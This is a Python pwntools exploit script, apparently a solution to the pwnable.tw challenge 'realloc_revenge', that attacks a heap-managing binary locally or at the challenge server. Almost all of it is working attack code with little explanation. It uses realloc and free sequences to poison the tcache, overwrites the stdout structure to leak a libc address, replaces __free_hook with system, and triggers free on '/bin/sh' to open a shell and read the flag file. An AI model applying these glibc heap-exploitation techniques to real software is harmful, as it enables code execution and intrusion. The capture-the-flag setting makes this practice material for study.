from pwn import *
import sys

if(len(sys.argv)>1):
    io = remote("chall.pwnable.tw",10310)
    context.noptrace=True
else:
    io = process("./back",env={"LD_PRELOAD":"./libc.so.6"})


def add(idx,size,data):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Index:",str(idx))
    io.sendlineafter("Size:",str(size))
    io.sendafter("Data:",str(data))

def re(idx,size,data=""):
    io.sendlineafter("Your choice: ","2")
    io.sendlineafter("Index:",str(idx))
    io.sendlineafter("Size:",str(size))
    if(size!=0):
        io.sendafter("Data:",str(data))

def free(idx):
    io.sendlineafter("Your choice: ","3")
    io.sendlineafter("Index:",str(idx))

payload = "\x00"*0x38 + p64(0x61)  # for fake chunk
add(0,0x50,payload)
re(0,0)
re(0,0x50,"\x00"*16)
re(0,0)
add(1,0x60,"dddd")
re(0,0x50,"\xa0")   # point to fake chunk
free(1)
payload = "\x00"*0x28 + p64(0x51)
add(1,0x70,payload)
free(1)
add(1,0x50,"first")
re(1,0x10,"realloc")
free(1)
re(0,0x10,"\x00"*16)
free(0)
payload = "\x00"*0x38 + p64(0x21)
add(1,0x60,payload)
for i in range(2):
    re(1,0)
    re(1,0x60,payload)      # put the chunk twice in tcache
#re(1,0)
payload = "\x00"*0x18 + p64(0xa1)+"\x00"*16
print("Overwrote size")
add(0,0x50,payload)
for i in range(7):
    re(1,0)
    re(0,0x50,payload)        # fill 0xa0 tcache
print("tcache filled")
free(1)           # go to unsortedbin
payload = "\x00"*0x18 + p64(0x71)+"\x60\xd7"  # make it again 0x70 size
re(0,0x50,payload)
free(0)
add(0,0x60,"free_fastbin")    # make tcache point to stdout
payload =  p64(0x00000000fbad3887) + p64(0)*3
print("overwrite stdout")
gdb.attach(io)
add(1,0x60,payload)
io.recv(8)
leak = u64(io.recv(6)+"\x00\x00")-0x1e7570
system = leak + 0x52fd0
string = "cat /home/realloc_revenge/flag\x00"
free_hook = leak + 0x1e75a8-8
log.info("libc @ "+str(hex(leak)))
re(0,0)
re(0,0x60,"\x00"*16)
re(0,0)
re(0,0x60,"\x00"*16)
free(0)
add(0,0x60,p64(free_hook))
re(0,0x30,"aaaaaa")
free(0)
payload = p64(0)*3 + p64(0x71) + p64(free_hook) + p64(0)
add(0,0x50,payload)
free(0)
add(0,0x60,"aaaaaaa")
re(0,0x40,"bbbbbb")
free(0)
payload = "/bin/sh\x00" + p64(system)
add(0,0x60,payload)
io.sendlineafter("Your choice: ","3")
io.sendlineafter("Index:","0")
try:
    io.sendline("cat /home/realloc_revenge/flag")
    flag = io.recvline()
    print(flag)
except:
    pass
io.interactive()
